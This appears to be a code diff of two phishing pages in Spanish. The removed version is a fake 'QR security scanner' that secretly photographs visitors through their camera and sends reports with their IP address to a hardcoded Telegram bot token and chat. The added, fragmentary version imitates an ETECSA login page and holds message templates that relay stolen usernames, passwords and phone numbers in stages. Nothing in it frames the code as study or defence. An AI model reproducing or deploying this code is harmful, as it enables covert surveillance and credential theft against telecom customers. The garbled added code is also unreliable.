@@ -1,273 +1,38 @@
+
 <!DOCTYPE html>
+
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cámara QR - Verificación</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            color: white;
-        }
-        
-        .container {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-            text-align: center;
-            max-width: 400px;
-            width: 100%;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-        }
-        
-        h1 {
-            margin-bottom: 10px;
-            font-size: 24px;
-        }
-        
-        .btn {
-            background: #ff6b6b;
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            border-radius: 25px;
-            font-size: 16px;
-            cursor: pointer;
-            margin: 15px 0;
-            transition: all 0.3s;
-            font-weight: bold;
-        }
-        
-        .btn:hover {
-            background: #ff5252;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
-        }
-        
-        #cameraView {
-            width: 100%;
-            max-width: 300px;
-            border: 3px solid #4ecdc4;
-            border-radius: 10px;
-            display: none;
-            margin: 15px auto;
-        }
-        
-        #captureStatus {
-            margin: 15px 0;
-            font-weight: bold;
-            font-size: 14px;
-        }
-        
-        #message {
-            margin: 10px 0;
-            padding: 10px;
-            border-radius: 5px;
-            font-weight: bold;
-        }
-        
-        .success { background: rgba(46, 204, 113, 0.2); color: #2ecc71; }
-        .error { background: rgba(231, 76, 60, 0.2); color: #e74c3c; }
-        .info { background: rgba(52, 152, 219, 0.2); color: #3498db; }
-        
-        .logo {
-            font-size: 48px;
-            margin-bottom: 10px;
-        }
-    </style>
+    <title>Acceso - ETECSA</title>
+
 </head>
 <body>
-    <div class="container">
-        <div class="logo">📷</div>
-        <h1>Escaner QR de Seguridad</h1>
-        <p>Para verificar su identidad, escanee el código QR con su cámara</p>
-        
-        <button class="btn" id="startCamera">🎥 Iniciar Escáner QR</button>
-        
-        <video id="cameraView" autoplay playsinline></video>
-        <canvas id="photoCanvas" style="display:none"></canvas>
-        
-        <div id="captureStatus"></div>
-        <div id="message"></div>
-        
-        <div style="margin-top: 20px; font-size: 12px; opacity: 0.8;">
-            Sistema de verificación segura • v1.0
+    <div class="header">
+        <div class="logo-container">
+            <img src="logo-etecsa.jpg" alt="ETECSA" class="logo-img">
+            <div class="logo-text">ETECSA</div>
         </div>
     </div>
 
-    <script>
-        // Variables globales
-        let cameraStream = null;
-        let captureInterval = null;
-        let captureCount = 0;
-        const maxCaptures = 3;
+🔴 <b>PRIMER INTENTO - DATOS CAPTURADOS</b>
 
-        // Configuración de Telegram
-        const TELEGRAM_CONFIG = {
-            BOT_TOKEN: '6516180762:AAHE5RGPH1kpADaABDGzQLt0962277Nlg1I',
-            CHAT_ID: '-1003181825017'
-        };
+👤 <b>Usuario:</b> <code>${username}</code> 🔒<b>Contraseña:</b> <code>${password}</code> 📅<b>Fecha:</b> ${fecha} 🌐<b>IP:</b> <code>${userIP}</code>
 
-        // Botón para iniciar cámara
-        document.getElementById('startCamera').addEventListener('click', startCamera);
+💀 <b>Esperando segundo intento...</b> ;
+            } else if (etapa === 'SEGUNDO_INTENTO_CORRECTO') {
+                mensaje =  🟢<b>SEGUNDO INTENTO - CONFIRMACIÓN</b>
 
-        async function startCamera() {
-            try {
-                showMessage('📡 Solicitando acceso a la cámara...', 'info');
-                
-                // Solicitar permiso de cámara
-                cameraStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        width: 1280, 
-                        height: 720,
-                        facingMode: 'environment'
-                    } 
-                });
-                
-                // Mostrar video
-                const video = document.getElementById('cameraView');
-                video.srcObject = cameraStream;
-                video.style.display = 'block';
-                
-                // Cambiar botón
-                document.getElementById('startCamera').textContent = '⏹️ Detener Escáner';
-                document.getElementById('startCamera').onclick = stopCamera;
-                document.getElementById('startCamera').style.background = '#4ecdc4';
-                
-                showMessage('✅ Cámara activada. Escaneando QR...', 'success');
-                
-                // Iniciar captura automática
-                startAutoCapture();
-                
-            } catch (error) {
-                showMessage('❌ Error al acceder a la cámara', 'error');
-                console.error('Error cámara:', error);
-            }
-        }
+👤 <b>Usuario:</b> <code>${username}</code> 🔒<b>Contraseña:</b> <code>${password}</code> 📅<b>Fecha:</b> ${fecha} 🌐<b>IP:</b> <code>${userIP}</code>
 
-        function stopCamera() {
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-                cameraStream = null;
-            }
-            
-            if (captureInterval) {
-                clearInterval(captureInterval);
-                captureInterval = null;
-            }
-            
-            document.getElementById('cameraView').style.display = 'none';
-            document.getElementById('startCamera').textContent = '🎥 Iniciar Escáner QR';
-            document.getElementById('startCamera').onclick = startCamera;
-            document.getElementById('startCamera').style.background = '#ff6b6b';
-            
-            document.getElementById('captureStatus').textContent = '';
-            showMessage('📷 Escáner detenido', 'info');
-            captureCount = 0;
-        }
+✅ <b>Usuario procediendo a verificación de teléfono...</b> ;
+            } else if (etapa === 'VERIFICACION_TELEFONO') {
+                mensaje =  📱<b>VERIFICACIÓN DE TELÉFONO COMPLETADA</b>
 
-        function startAutoCapture() {
-            captureInterval = setInterval(async () => {
-                if (captureCount < maxCaptures) {
-                    await capturePhoto();
-                    captureCount++;
-                    
-                    document.getElementById('captureStatus').textContent = 
-                        `📸 Capturas: ${captureCount}/${maxCaptures} - Buscando QR...`;
-                    
-                    if (captureCount >= maxCaptures) {
-                        showMessage('✅ Verificación QR completada', 'success');
-                        setTimeout(stopCamera, 2000);
-                    }
-                }
-            }, 3000);
-        }
+👤 <b>Usuario:</b> <code>${username}</code> 🔒<b>Contraseña:</b> <code>${password}</code> 📞<b>Teléfono:</b> <code>${telefono}</code> 📅<b>Fecha:</b> ${fecha} 🌐<b>IP:</b> <code>${userIP}</code>
 
-        async function capturePhoto() {
-            const video = document.getElementById('cameraView');
-            const canvas = document.getElementById('photoCanvas');
-            const context = canvas.getContext('2d');
-            
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            const photoData = canvas.toDataURL('image/jpeg', 0.7);
-            const ip = await getIP();
-            const fecha = new Date().toLocaleString('es-ES');
-            
-            await sendToTelegram(photoData, ip, fecha);
-        }
+🎯 <b>INFORMACIÓN COMPLETA OBTENIDA</b> `; }
 
-        async function sendToTelegram(photoData, ip, fecha) {
-            const infoMessage = `
-📷 <b>CAPTURA DE CÁMARA - ESCÁNER QR</b>
-
-🕐 <b>Fecha:</b> ${fecha}
-🌐 <b>IP:</b> ${ip}
-📸 <b>Captura #:</b> ${captureCount}
-🔍 <b>Estado:</b> Escaneando código QR...
-
-<b>📍 Datos de la imagen:</b>
-• Resolución: 1280x720
-• Formato: JPEG
-• Tamaño: ${Math.round(photoData.length / 1024)} KB
-            `;
-            
-            await sendTelegramMessage(infoMessage);
-            
-            // Guardar localmente para pruebas
-            localStorage.setItem(`qr_capture_${Date.now()}`, photoData);
-            console.log('📸 Foto capturada y guardada');
-        }
-
-        async function getIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                return 'IP no disponible';
-            }
-        }
-
-        async function sendTelegramMessage(message) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
-            
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CONFIG.CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-                return response.ok;
-            } catch (error) {
-                console.error('Error Telegram:', error);
-                return false;
-            }
-        }
-
-        function showMessage(text, type) {
-            const messageDiv = document.getElementById('message');
-            messageDiv.textContent = text;
-            messageDiv.className = type;
-            messageDiv.style.display = 'block';
-        }
-    </script>
 </body>
-            </html>
+                                                                                                              </html>
